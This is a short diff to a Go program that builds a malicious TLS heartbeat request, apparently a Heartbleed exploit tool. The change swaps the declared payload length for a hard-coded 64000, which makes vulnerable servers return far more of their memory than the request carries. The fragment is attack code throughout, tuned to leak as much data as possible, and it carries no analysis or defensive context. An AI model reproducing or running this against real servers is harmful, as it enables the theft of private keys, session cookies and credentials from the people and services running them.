@@ -29,12 +29,14 @@ var padding = []byte("YELLOW SUBMARINE")
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
 func buildEvilMessage(payload []byte) []byte {
+	var myluckynumber uint16 = 64000
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
 		panic(err)
 	}
-	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
+	//err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
+	err = binary.Write(&buf, binary.BigEndian, uint16(myluckynumber))
 	if err != nil {
 		panic(err)
 	}
